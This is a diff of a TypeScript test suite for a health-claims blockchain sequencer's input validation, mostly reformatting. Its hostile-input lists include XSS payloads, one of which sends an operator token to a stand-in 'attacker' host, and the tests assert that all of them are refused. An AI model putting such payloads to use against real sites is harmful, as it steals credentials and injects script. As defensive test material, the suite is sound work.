@@ -81,8 +81,31 @@ const bearer = { Authorization: `Bearer ${OPERATOR}` };
 
 /** A wallet ID as the network issues one: a Poseidon hash, written by Field.toString(). */
 const REAL_WALLET = Poseidon.hash([Field(7), Field(11)]).toString();
-const HOSTILE_IDS = ['1" onmouseover="steal()', '<img src=x onerror=steal()>', "1' onfocus='steal()", '', '0x1f', '01', '-1', '+1', '1e3', ' 12', '12 ', '1001\n'];
-const HOSTILE_NAMES = ['<img src=x onerror="fetch(`https://attacker/?t=`+localStorage.zkt_operator_token)">', 'Dr. <b>Quill</b>', 'a'.repeat(101), '   ', 'Line one\nLine two', 'Tab\there', 'Null\u0000byte', 'Bell\u0007', 'C1\u0085control'];
+const HOSTILE_IDS = [
+  '1" onmouseover="steal()',
+  '<img src=x onerror=steal()>',
+  "1' onfocus='steal()",
+  '',
+  '0x1f',
+  '01',
+  '-1',
+  '+1',
+  '1e3',
+  ' 12',
+  '12 ',
+  '1001\n',
+];
+const HOSTILE_NAMES = [
+  '<img src=x onerror="fetch(`https://attacker/?t=`+localStorage.zkt_operator_token)">',
+  'Dr. <b>Quill</b>',
+  'a'.repeat(101),
+  '   ',
+  'Line one\nLine two',
+  'Tab\there',
+  'Null\u0000byte',
+  'Bell\u0007',
+  'C1\u0085control',
+];
 /** npiError's two refusals. */
 const NOT_AN_NPI = 'npi must be a National Provider Identifier: ten digits';
 const WRONG_CHECK_DIGIT = 'npi has the wrong check digit for a National Provider Identifier';
@@ -98,7 +121,7 @@ function lookalikes(npi: string): Array<[string, string, string]> {
     ['a trailing space', `${npi} `, NOT_AN_NPI],
     ['a leading space', ` ${npi}`, NOT_AN_NPI],
     ['a no-break space after it', `${npi}\u00A0`, NOT_AN_NPI],
-    ['full-width digits', [...npi].map((d) => String.fromCharCode(0xFF10 + Number(d))).join(''), NOT_AN_NPI],
+    ['full-width digits', [...npi].map((d) => String.fromCharCode(0xff10 + Number(d))).join(''), NOT_AN_NPI],
     ['a wrong check digit', npi.slice(0, 9) + String((Number(npi[9]) + 1) % 10), WRONG_CHECK_DIGIT],
   ];
 }
@@ -113,17 +136,32 @@ const keptNames: string[] = [];
 function standInService(): AdjudicationService {
   const svc = {
     async registerMemberFromEnrollment(opts: { walletId: string; displayName: string }) {
-      if (opts.walletId === '42') throw new RegistrationRefused(403, 'This wallet has no insurer approval: complete enrollment with the insurer first');
+      if (opts.walletId === '42')
+        throw new RegistrationRefused(403, 'This wallet has no insurer approval: complete enrollment with the insurer first');
       keptNames.push(opts.displayName);
       return { walletId: opts.walletId, displayName: opts.displayName };
     },
-    getState() { return { compiled: true, enrolledMembers: [] }; },
+    getState() {
+      return { compiled: true, enrolledMembers: [] };
+    },
   };
-  return new Proxy(svc, { get(t, p) { if (p in t) return (t as any)[p]; if (typeof p === 'string' && p !== 'then') throw new Error(`stand-in service has no ${p}`); return undefined; } }) as unknown as AdjudicationService;
+  return new Proxy(svc, {
+    get(t, p) {
+      if (p in t) return (t as any)[p];
+      if (typeof p === 'string' && p !== 'then') throw new Error(`stand-in service has no ${p}`);
+      return undefined;
+    },
+  }) as unknown as AdjudicationService;
 }
 
 beforeAll(async () => {
-  node = new L2Node({ batchIntervalMs: 999_999, autoSettle: false, nodeId: 'seq-registry-fields' }, new InMemoryStore(), emptyRoot, emptyRoot, Field(0));
+  node = new L2Node(
+    { batchIntervalMs: 999_999, autoSettle: false, nodeId: 'seq-registry-fields' },
+    new InMemoryStore(),
+    emptyRoot,
+    emptyRoot,
+    Field(0),
+  );
   server = new L2RpcServer(node, { port: 0, host: '127.0.0.1', adminToken: OPERATOR, enableSSE: false });
   server.registerNodeKey(member.nodeId, member.publicKeyHex, 'member');
   registerInteractiveRoutes(server, standInService());
@@ -131,9 +169,14 @@ beforeAll(async () => {
   url = `http://127.0.0.1:${server.getPort()}`;
 });
 
-afterAll(async () => { await server.stop(); });
+afterAll(async () => {
+  await server.stop();
+});
 
-interface RpcReply { error?: { code: number; message: string }; result?: any }
+interface RpcReply {
+  error?: { code: number; message: string };
+  result?: any;
+}
 
 /** l2_registerEntity, signed by the member node's key (`asMember`) or with the operator's bearer. */
 async function registerEntity(params: Record<string, unknown>, asMember = true): Promise<RpcReply> {
@@ -142,13 +185,13 @@ async function registerEntity(params: Record<string, unknown>, asMember = true):
     ? signRequest({ signerId: member.nodeId, privateKey: privateKeyFromSeedHex(member.seedHex), method: 'POST', path: '/rpc', body })
     : bearer;
   const r = await fetch(`${url}/rpc`, { method: 'POST', headers: { 'Content-Type': 'application/json', ...headers }, body });
-  return await r.json() as RpcReply;
+  return (await r.json()) as RpcReply;
 }
 
 /** The sequencer's entity registry, as the operator reads it. */
 async function entities(): Promise<Array<Record<string, unknown> & { walletId: string }>> {
   const r = await fetch(`${url}/viz/entities`, { headers: bearer });
-  return await r.json() as Array<Record<string, unknown> & { walletId: string }>;
+  return (await r.json()) as Array<Record<string, unknown> & { walletId: string }>;
 }
 
 /** The wallet IDs in the sequencer's entity registry, as the operator reads them. */
@@ -160,7 +203,7 @@ async function registeredIds(): Promise<string[]> {
 async function operatorRpc(method: string, params: Record<string, unknown>): Promise<RpcReply> {
   const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method, params });
   const r = await fetch(`${url}/rpc`, { method: 'POST', headers: { 'Content-Type': 'application/json', ...bearer }, body });
-  return await r.json() as RpcReply;
+  return (await r.json()) as RpcReply;
 }
 
 /** How many providers the provider registry holds. */
@@ -172,16 +215,20 @@ async function providerCount(): Promise<string> {
 async function submit(params: Record<string, unknown>): Promise<RpcReply> {
   const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'l2_submitProof', params });
   const r = await fetch(`${url}/rpc`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body });
-  return await r.json() as RpcReply;
+  return (await r.json()) as RpcReply;
 }
 
 async function registerMember(body: Record<string, unknown>): Promise<{ status: number; json: any }> {
-  const r = await fetch(`${url}/interactive/register-member`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
+  const r = await fetch(`${url}/interactive/register-member`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body),
+  });
   return { status: r.status, json: await r.json().catch(() => null) };
 }
 
 describe('what a wallet ID and a display name may be', () => {
-  test('the modulus is o1js\'s Field.ORDER', async () => {
+  test("the modulus is o1js's Field.ORDER", async () => {
     const { FIELD_MODULUS } = await import('../src/security/wallet-id.js');
     expect(FIELD_MODULUS).toBe(Field.ORDER);
   });
@@ -192,19 +239,22 @@ describe('what a wallet ID and a display name may be', () => {
       expect([ok, walletIdError(ok)]).toEqual([ok, null]);
     }
     for (const bad of [...HOSTILE_IDS, Field.ORDER.toString(), (Field.ORDER + 5n).toString(), '9'.repeat(100)]) {
-      expect([bad, walletIdError(bad)]).toEqual([bad, expect.stringMatching(/^walletId must be (a field element written in decimal|less than the field modulus)/)]);
+      expect([bad, walletIdError(bad)]).toEqual([
+        bad,
+        expect.stringMatching(/^walletId must be (a field element written in decimal|less than the field modulus)/),
+      ]);
     }
-    expect(walletIdError(1001)).toMatch(/field element written in decimal/);   // a number is not how the network writes one
+    expect(walletIdError(1001)).toMatch(/field element written in decimal/); // a number is not how the network writes one
     expect(walletIdError(undefined, 'pcpWalletId')).toMatch(/^pcpWalletId must be/);
   });
 
   test('a value longer than any field element is refused without being read as a number', async () => {
     const { walletIdError, FIELD_MODULUS } = await import('../src/security/wallet-id.js');
-    expect(FIELD_MODULUS.toString().length).toBe(77);                       // so no field element has more digits
+    expect(FIELD_MODULUS.toString().length).toBe(77); // so no field element has more digits
     const parsed = jest.spyOn(globalThis, 'BigInt');
     try {
       expect(walletIdError('9'.repeat(100_000))).toBe('walletId must be less than the field modulus');
-      expect(walletIdError((FIELD_MODULUS - 1n).toString())).toBeNull();    // 77 digits: read, and below the modulus
+      expect(walletIdError((FIELD_MODULUS - 1n).toString())).toBeNull(); // 77 digits: read, and below the modulus
       // before: [100000, 77] — BigInt read all 100,000 digits, work that grows faster than the length, per request
       expect(parsed.mock.calls.map(([v]) => String(v).length)).toEqual([77]);
     } finally {
@@ -215,7 +265,14 @@ describe('what a wallet ID and a display name may be', () => {
   test('a display name is one short line of plain text: quotes and ampersands are fine, markup and controls are not', async () => {
     const { displayNameError, DISPLAY_NAME_MAX_LENGTH } = await import('../src/security/free-text.js');
     expect(DISPLAY_NAME_MAX_LENGTH).toBe(100);
-    for (const ok of ['Member', 'Dr. Avery Quill, MD', "O'Brien & Sons Pharmacy #12", 'Quillfeather Pharmacy #8871', 'a'.repeat(100), 'Zoë Ångström']) {
+    for (const ok of [
+      'Member',
+      'Dr. Avery Quill, MD',
+      "O'Brien & Sons Pharmacy #12",
+      'Quillfeather Pharmacy #8871',
+      'a'.repeat(100),
+      'Zoë Ångström',
+    ]) {
       expect([ok, displayNameError(ok)]).toEqual([ok, null]);
     }
     for (const bad of HOSTILE_NAMES) expect([bad, displayNameError(bad)]).toEqual([bad, expect.stringMatching(/^displayName /)]);
@@ -227,7 +284,8 @@ describe('what a wallet ID and a display name may be', () => {
 describe('what an NPI may be', () => {
   test('every NPI the seed providers carry is one, as the provider nodes register it and the insurer credentials it: ten digits, the last the check digit CMS publishes', async () => {
     const { npiError } = await import('../src/security/npi.js');
-    const seed = (file: string): Array<Record<string, any>> => JSON.parse(fs.readFileSync(path.resolve(__dirname, '..', 'src', 'data', file), 'utf8'));
+    const seed = (file: string): Array<Record<string, any>> =>
+      JSON.parse(fs.readFileSync(path.resolve(__dirname, '..', 'src', 'data', file), 'utf8'));
     // The NPI each record lists, and the claim identifier the nodes and the insurer's boot send as its npi.
     const sent = [
       ...seed('prescribers.json').flatMap((p) => [p.npi, p.localData.prescriberId]),
@@ -235,7 +293,7 @@ describe('what an NPI may be', () => {
     ];
     expect(sent.length).toBeGreaterThan(0);
     for (const npi of sent) expect([npi, npiError(npi)]).toEqual([npi, null]);
-    for (const npi of ['1234567893', '1245319599']) expect([npi, npiError(npi)]).toEqual([npi, null]);   // the worked example CMS publishes, and another these tests send
+    for (const npi of ['1234567893', '1245319599']) expect([npi, npiError(npi)]).toEqual([npi, null]); // the worked example CMS publishes, and another these tests send
   });
 
   test('a wrong check digit, a space or an invisible character beside the digits, nine or eleven digits, a number and null are not', async () => {
@@ -259,7 +317,11 @@ describe('l2_registerEntity', () => {
   test('refuses a wallet ID that is not a field element in decimal, saying why, and keeps nothing', async () => {
     for (const walletId of HOSTILE_IDS.filter((id) => id !== '')) {
       const r = await registerEntity({ walletId, displayName: 'Mallory', type: 'member' });
-      expect([walletId, r.error?.code, r.error?.message]).toEqual([walletId, RPC_INVALID_PARAMS, 'walletId must be a field element written in decimal: digits only, with no leading zero']);   // before: { ok: true }
+      expect([walletId, r.error?.code, r.error?.message]).toEqual([
+        walletId,
+        RPC_INVALID_PARAMS,
+        'walletId must be a field element written in decimal: digits only, with no leading zero',
+      ]); // before: { ok: true }
     }
     const beyond = await registerEntity({ walletId: Field.ORDER.toString(), displayName: 'Mallory', type: 'member' });
     expect(beyond.error?.message).toBe('walletId must be less than the field modulus');
@@ -269,7 +331,11 @@ describe('l2_registerEntity', () => {
   test('refuses a display name with markup, a control character, no text or more than 100 characters', async () => {
     for (const displayName of HOSTILE_NAMES) {
       const r = await registerEntity({ walletId: '1003', displayName, type: 'member' });
-      expect([displayName, r.error?.code, r.error?.message]).toEqual([displayName, RPC_INVALID_PARAMS, expect.stringMatching(/^displayName may/)]);   // before: { ok: true }
+      expect([displayName, r.error?.code, r.error?.message]).toEqual([
+        displayName,
+        RPC_INVALID_PARAMS,
+        expect.stringMatching(/^displayName may/),
+      ]); // before: { ok: true }
     }
     expect(await registeredIds()).not.toContain('1003');
   });
@@ -280,7 +346,7 @@ describe('l2_registerEntity', () => {
     expect(await registeredIds()).toEqual([]);
   });
 
-  test('registers what every caller sends: a Field\'s decimal string with a seed or configured name', async () => {
+  test("registers what every caller sends: a Field's decimal string with a seed or configured name", async () => {
     const asNode = await registerEntity({ walletId: REAL_WALLET, displayName: 'Member', type: 'member' });
     expect(asNode.error).toBeUndefined();
     expect(asNode.result).toEqual({ ok: true, walletId: REAL_WALLET, displayName: 'Member', type: 'member' });
@@ -299,7 +365,11 @@ describe('l2_registerEntity', () => {
   test('refuses a kind the network does not have, the operator included', async () => {
     for (const type of ['superuser', 'Insurer', 'member ', '<b>member</b>', 'operator', 7]) {
       const r = await registerEntity({ walletId: '1006', displayName: 'Mallory', type }, false);
-      expect([type, r.error?.code, r.error?.message]).toEqual([type, RPC_INVALID_PARAMS, 'type must be one of member, prescriber, pharmacy, insurer, employer, leviathan, worker']);   // before: { ok: true }
+      expect([type, r.error?.code, r.error?.message]).toEqual([
+        type,
+        RPC_INVALID_PARAMS,
+        'type must be one of member, prescriber, pharmacy, insurer, employer, leviathan, worker',
+      ]); // before: { ok: true }
     }
     expect(await registeredIds()).not.toContain('1006');
   });
@@ -314,7 +384,7 @@ describe('l2_registerEntity', () => {
     ];
     for (const [label, value, why] of cases) {
       const r = await registerEntity({ walletId: '1007', displayName: 'Member', type: 'member', [label]: value });
-      expect([label, value, r.error?.code, r.error?.message]).toEqual([label, value, RPC_INVALID_PARAMS, why]);   // before: { ok: true }
+      expect([label, value, r.error?.code, r.error?.message]).toEqual([label, value, RPC_INVALID_PARAMS, why]); // before: { ok: true }
     }
     expect(await registeredIds()).not.toContain('1007');
   });
@@ -322,7 +392,11 @@ describe('l2_registerEntity', () => {
   test('refuses an encryption key that is not 32 bytes of hex', async () => {
     for (const encryptionPublicKeyHex of ['zz'.repeat(32), 'ab'.repeat(31), 'ab'.repeat(33), '"><img src=x>', 42]) {
       const r = await registerEntity({ walletId: '1008', displayName: 'Member', type: 'member', encryptionPublicKeyHex });
-      expect([encryptionPublicKeyHex, r.error?.code, r.error?.message]).toEqual([encryptionPublicKeyHex, RPC_INVALID_PARAMS, 'encryptionPublicKeyHex must be 32 bytes (64 hex chars)']);   // before: { ok: true }
+      expect([encryptionPublicKeyHex, r.error?.code, r.error?.message]).toEqual([
+        encryptionPublicKeyHex,
+        RPC_INVALID_PARAMS,
+        'encryptionPublicKeyHex must be 32 bytes (64 hex chars)',
+      ]); // before: { ok: true }
     }
     expect(await registeredIds()).not.toContain('1008');
   });
@@ -330,15 +404,26 @@ describe('l2_registerEntity', () => {
   test('registers what the member and provider nodes send, labels and keys included', async () => {
     const memberWallet = Poseidon.hash([Field(13), Field(17)]).toString();
     const asMember = await registerEntity({
-      walletId: memberWallet, displayName: 'Member', type: 'member', group: 'GRP-ACME-001',
-      encryptionPublicKeyHex: 'AB'.repeat(32), signingPublicKeyHex: 'cd'.repeat(32),
+      walletId: memberWallet,
+      displayName: 'Member',
+      type: 'member',
+      group: 'GRP-ACME-001',
+      encryptionPublicKeyHex: 'AB'.repeat(32),
+      signingPublicKeyHex: 'cd'.repeat(32),
     });
     expect(asMember.error).toBeUndefined();
     const prescriberWallet = Poseidon.hash([Field(19), Field(23)]).toString();
-    const asOperator = await registerEntity({ walletId: prescriberWallet, displayName: 'Dr. Avery Quill, MD', type: 'prescriber', specialty: 'Family Medicine', group: '' }, false);
+    const asOperator = await registerEntity(
+      { walletId: prescriberWallet, displayName: 'Dr. Avery Quill, MD', type: 'prescriber', specialty: 'Family Medicine', group: '' },
+      false,
+    );
     expect(asOperator.error).toBeUndefined();
     const listed = await entities();
-    expect(listed.find((e) => e.walletId === memberWallet)).toMatchObject({ type: 'member', group: 'GRP-ACME-001', encryptionPublicKeyHex: 'ab'.repeat(32) });
+    expect(listed.find((e) => e.walletId === memberWallet)).toMatchObject({
+      type: 'member',
+      group: 'GRP-ACME-001',
+      encryptionPublicKeyHex: 'ab'.repeat(32),
+    });
     expect(listed.find((e) => e.walletId === prescriberWallet)).toMatchObject({ type: 'prescriber', specialty: 'Family Medicine' });
   });
 
@@ -348,8 +433,14 @@ describe('l2_registerEntity', () => {
     const ok = await registerEntity({ ...prescriber, walletId: genuine, npi: '1245319599' }, false);
     expect(ok.error).toBeUndefined();
     expect(await registeredIds()).toContain(genuine);
-    expect((await operatorRpc('l2_getProvider', { walletId: genuine })).result).toMatchObject({ providerType: 'prescriber', npi: '1245319599', credentialStateName: 'active' });
-    expect((await operatorRpc('l2_getProviderByNpi', { npiHash: hashString('1245319599').toString() })).result).toMatchObject({ walletId: genuine });
+    expect((await operatorRpc('l2_getProvider', { walletId: genuine })).result).toMatchObject({
+      providerType: 'prescriber',
+      npi: '1245319599',
+      credentialStateName: 'active',
+    });
+    expect((await operatorRpc('l2_getProviderByNpi', { npiHash: hashString('1245319599').toString() })).result).toMatchObject({
+      walletId: genuine,
+    });
 
     // Each impostor's npi hashed to a key of its own, which the registry's one-provider-to-an-NPI index let by.
     const providers = await providerCount();
@@ -358,7 +449,7 @@ describe('l2_registerEntity', () => {
       const walletId = Poseidon.hash([Field(43), Field(100 + impostors.length)]).toString();
       impostors.push(walletId);
       const r = await registerEntity({ ...prescriber, walletId, npi }, false);
-      expect([what, r.error?.code, r.error?.message]).toEqual([what, RPC_INVALID_PARAMS, why]);   // before: { ok: true }, and credentialed beside the genuine provider
+      expect([what, r.error?.code, r.error?.message]).toEqual([what, RPC_INVALID_PARAMS, why]); // before: { ok: true }, and credentialed beside the genuine provider
     }
     // The plain-text rule refused these already, in its own words; the NPI rule refuses them first.
     const plainTextRefused: Array<[string, string]> = [
@@ -369,13 +460,13 @@ describe('l2_registerEntity', () => {
     ];
     for (const [what, npi] of plainTextRefused) {
       const r = await registerEntity({ ...prescriber, walletId: impostors[0], npi }, false);
-      expect([what, r.error?.code, r.error?.message]).toEqual([what, RPC_INVALID_PARAMS, NOT_AN_NPI]);   // before: refused, as 'npi may be at most 100 characters' or 'npi may not contain control characters'
+      expect([what, r.error?.code, r.error?.message]).toEqual([what, RPC_INVALID_PARAMS, NOT_AN_NPI]); // before: refused, as 'npi may be at most 100 characters' or 'npi may not contain control characters'
     }
     const listed = await registeredIds();
-    for (const walletId of impostors) expect(listed).not.toContain(walletId);                 // before: listed
-    expect(await providerCount()).toBe(providers);                                           // before: one provider more for each impostor
+    for (const walletId of impostors) expect(listed).not.toContain(walletId); // before: listed
+    expect(await providerCount()).toBe(providers); // before: one provider more for each impostor
     for (const [what, npi] of lookalikes('1245319599')) {
-      expect([what, (await operatorRpc('l2_getProviderByNpi', { npiHash: hashString(npi).toString() })).result]).toEqual([what, null]);   // before: the impostor's credential
+      expect([what, (await operatorRpc('l2_getProviderByNpi', { npiHash: hashString(npi).toString() })).result]).toEqual([what, null]); // before: the impostor's credential
     }
   });
 });
@@ -383,9 +474,17 @@ describe('l2_registerEntity', () => {
 describe('l2_submitProof', () => {
   test('takes no entity metadata: a proof that brings a name and a kind is refused before it is read, and the registry keeps nothing', async () => {
     const SELF = Poseidon.hash([Field(29), Field(31)]).toString();
-    const proof = await StateTransitionProof.dummy(undefined, new TransitionOutput({
-      walletId: Field(SELF), oldRegistryRoot: emptyRoot, newRegistryRoot: Field(1), oldLifecycleRoot: Field(0), newLifecycleRoot: Field(0),
-    }), 0);
+    const proof = await StateTransitionProof.dummy(
+      undefined,
+      new TransitionOutput({
+        walletId: Field(SELF),
+        oldRegistryRoot: emptyRoot,
+        newRegistryRoot: Field(1),
+        oldLifecycleRoot: Field(0),
+        newLifecycleRoot: Field(0),
+      }),
+      0,
+    );
     // The node accepts the registration: whether a proof verifies is the verifier's test, not this one.
     const reached: string[] = [];
     const submitProof = node.submitProof;
@@ -394,16 +493,22 @@ describe('l2_submitProof', () => {
       return { isRegistration: true, walletId: SELF };
     }) as unknown as typeof node.submitProof;
     try {
-      const claimed = await submit({ proofJson: proof.toJSON(), entityMetadata: { displayName: 'Acme Health Insurance', type: 'insurer' } });
+      const claimed = await submit({
+        proofJson: proof.toJSON(),
+        entityMetadata: { displayName: 'Acme Health Insurance', type: 'insurer' },
+      });
       // before: accepted, and the new wallet was listed as the insurer "Acme Health Insurance"
-      expect(claimed.error).toMatchObject({ code: RPC_INVALID_PARAMS, message: "l2_submitProof takes no entityMetadata: an entity's name and kind are registered with l2_registerEntity" });
+      expect(claimed.error).toMatchObject({
+        code: RPC_INVALID_PARAMS,
+        message: "l2_submitProof takes no entityMetadata: an entity's name and kind are registered with l2_registerEntity",
+      });
       expect(reached).toEqual([]);
       expect(await registeredIds()).not.toContain(SELF);
 
       const alone = await submit({ proofJson: proof.toJSON() });
       expect(alone.error).toBeUndefined();
-      expect(reached).toEqual([SELF]);                                     // a proof alone still reaches the node
-      expect(await registeredIds()).not.toContain(SELF);                   // and names no entity
+      expect(reached).toEqual([SELF]); // a proof alone still reaches the node
+      expect(await registeredIds()).not.toContain(SELF); // and names no entity
     } finally {
       node.submitProof = submitProof;
     }
@@ -413,10 +518,17 @@ describe('l2_submitProof', () => {
 describe('l2_credentialProvider', () => {
   test('keeps what l2_registerEntity keeps: a wallet ID as the network writes one, and short lines of plain text', async () => {
     const credential = (params: Record<string, unknown>): Promise<RpcReply> => operatorRpc('l2_credentialProvider', params);
-    const base = { displayName: 'Dr. Avery Quill, MD', providerType: 'prescriber', npi: '1234567893', specialty: 'Family Medicine', stateOfLicense: 'TX', deaNumber: 'AQ1234563' };
+    const base = {
+      displayName: 'Dr. Avery Quill, MD',
+      providerType: 'prescriber',
+      npi: '1234567893',
+      specialty: 'Family Medicine',
+      stateOfLicense: 'TX',
+      deaNumber: 'AQ1234563',
+    };
     const NOT_DECIMAL = 'walletId must be a field element written in decimal: digits only, with no leading zero';
     const refused: Array<[Record<string, unknown>, string]> = [
-      [{ walletId: '0x1f' }, NOT_DECIMAL],                                  // BigInt reads these; the network writes none of them
+      [{ walletId: '0x1f' }, NOT_DECIMAL], // BigInt reads these; the network writes none of them
       [{ walletId: ' 17' }, NOT_DECIMAL],
       [{ walletId: '1013', displayName: 'Dr <b>Quill</b>' }, 'displayName may not contain < or >'],
       [{ walletId: '1013', deaNumber: 'AQ123\n4563' }, 'deaNumber may not contain control characters'],
@@ -424,7 +536,7 @@ describe('l2_credentialProvider', () => {
     ];
     for (const [over, why] of refused) {
       const r = await credential({ ...base, ...over });
-      expect([over, r.error?.code, r.error?.message]).toEqual([over, RPC_INVALID_PARAMS, why]);   // before: credentialed
+      expect([over, r.error?.code, r.error?.message]).toEqual([over, RPC_INVALID_PARAMS, why]); // before: credentialed
     }
     const ids = await registeredIds();
     for (const id of ['0x1f', ' 17', '1013']) expect(ids).not.toContain(id);
@@ -435,12 +547,21 @@ describe('l2_credentialProvider', () => {
   test('refuses an npi that is not a National Provider Identifier before it is hashed, so none is credentialed beside the provider whose NPI it reads as; a real NPI still credentials', async () => {
     const credential = (params: Record<string, unknown>): Promise<RpcReply> => operatorRpc('l2_credentialProvider', params);
     // The first seed pharmacy, as the insurer credentials it at boot.
-    const pharmacy = { displayName: 'Kettleby Pharmacy', providerType: 'pharmacy', pharmacyType: 'Community/Retail', stateOfLicense: 'WI', verificationMethod: 'manual' };
+    const pharmacy = {
+      displayName: 'Kettleby Pharmacy',
+      providerType: 'pharmacy',
+      pharmacyType: 'Community/Retail',
+      stateOfLicense: 'WI',
+      verificationMethod: 'manual',
+    };
     const genuine = Poseidon.hash([Field(61), Field(67)]).toString();
     const ok = await credential({ ...pharmacy, walletId: genuine, npi: '2999000518' });
     expect(ok.error).toBeUndefined();
     expect(await registeredIds()).toContain(genuine);
-    expect((await operatorRpc('l2_getProviderByNpi', { npiHash: hashString('2999000518').toString() })).result).toMatchObject({ walletId: genuine, providerType: 'pharmacy' });
+    expect((await operatorRpc('l2_getProviderByNpi', { npiHash: hashString('2999000518').toString() })).result).toMatchObject({
+      walletId: genuine,
+      providerType: 'pharmacy',
+    });
 
     const providers = await providerCount();
     const impostors: string[] = [];
@@ -448,12 +569,12 @@ describe('l2_credentialProvider', () => {
       const walletId = Poseidon.hash([Field(61), Field(100 + impostors.length)]).toString();
       impostors.push(walletId);
       const r = await credential({ ...pharmacy, walletId, npi });
-      expect([what, r.error?.code, r.error?.message]).toEqual([what, RPC_INVALID_PARAMS, why]);   // before: credentialed beside the genuine pharmacy, under an npiHash of its own
+      expect([what, r.error?.code, r.error?.message]).toEqual([what, RPC_INVALID_PARAMS, why]); // before: credentialed beside the genuine pharmacy, under an npiHash of its own
     }
-    expect(await providerCount()).toBe(providers);                                           // before: one provider more for each impostor
+    expect(await providerCount()).toBe(providers); // before: one provider more for each impostor
     const listed = await registeredIds();
-    for (const walletId of impostors) expect(listed).not.toContain(walletId);                 // before: listed
-    for (const walletId of impostors) expect(await operatorRpc('l2_getProvider', { walletId })).toMatchObject({ result: null });   // before: credentialed
+    for (const walletId of impostors) expect(listed).not.toContain(walletId); // before: listed
+    for (const walletId of impostors) expect(await operatorRpc('l2_getProvider', { walletId })).toMatchObject({ result: null }); // before: credentialed
 
     // Written as itself, the NPI is the registry's to refuse, as it always was: one provider to an NPI.
     const twin = await credential({ ...pharmacy, walletId: impostors[0], npi: '2999000518' });
@@ -468,10 +589,21 @@ describe('l2_credentialProvider', () => {
 });
 
 describe('POST /viz/entities', () => {
-  test('is gone: it wrote whole entities past every rule above, keys included; the visualizer engine\'s scenario posted to it without a credential, was refused, and posts no more', async () => {
-    const hostile = [{ walletId: '1009" onmouseover="steal()', displayName: '<img src=x onerror=steal()>', type: 'superuser', signingPublicKeyHex: 'ee'.repeat(32) }];
-    const r = await fetch(`${url}/viz/entities`, { method: 'POST', headers: { ...bearer, 'Content-Type': 'application/json' }, body: JSON.stringify(hostile) });
-    expect(r.status).toBe(404);                                            // before: 200 { ok: true, count: 1 }
+  test("is gone: it wrote whole entities past every rule above, keys included; the visualizer engine's scenario posted to it without a credential, was refused, and posts no more", async () => {
+    const hostile = [
+      {
+        walletId: '1009" onmouseover="steal()',
+        displayName: '<img src=x onerror=steal()>',
+        type: 'superuser',
+        signingPublicKeyHex: 'ee'.repeat(32),
+      },
+    ];
+    const r = await fetch(`${url}/viz/entities`, {
+      method: 'POST',
+      headers: { ...bearer, 'Content-Type': 'application/json' },
+      body: JSON.stringify(hostile),
+    });
+    expect(r.status).toBe(404); // before: 200 { ok: true, count: 1 }
     expect(await registeredIds()).not.toContain(hostile[0].walletId);
   });
 });
@@ -481,19 +613,22 @@ describe('register-member', () => {
     keptNames.length = 0;
     for (const displayName of HOSTILE_NAMES) {
       const r = await registerMember({ walletId: '123456789', ownershipProofJson: '{"stand-in":true}', displayName });
-      expect([displayName, r.status, r.json?.error]).toEqual([displayName, 400, expect.stringMatching(/^displayName may/)]);   // before: 200, and the engine kept the name
+      expect([displayName, r.status, r.json?.error]).toEqual([displayName, 400, expect.stringMatching(/^displayName may/)]); // before: 200, and the engine kept the name
     }
     expect(keptNames).toEqual([]);
   });
 
   test('keeps a plain name, and names a member with none "Member"', async () => {
     keptNames.length = 0;
-    expect((await registerMember({ walletId: '123456789', ownershipProofJson: '{"stand-in":true}', displayName: "Member device 4101 (O'Neil)" })).status).toBe(200);
+    expect(
+      (await registerMember({ walletId: '123456789', ownershipProofJson: '{"stand-in":true}', displayName: "Member device 4101 (O'Neil)" }))
+        .status,
+    ).toBe(200);
     expect((await registerMember({ walletId: '123456789', ownershipProofJson: '{"stand-in":true}' })).status).toBe(200);
     expect(keptNames).toEqual(["Member device 4101 (O'Neil)", 'Member']);
   });
 
-  test('its other checks are unchanged: the body first, then the engine\'s approval gate', async () => {
+  test("its other checks are unchanged: the body first, then the engine's approval gate", async () => {
     expect((await registerMember({ walletId: '42' })).status).toBe(400);
     const unapproved = await registerMember({ walletId: '42', ownershipProofJson: '{}', displayName: 'Mallory' });
     expect(unapproved.status).toBe(403);
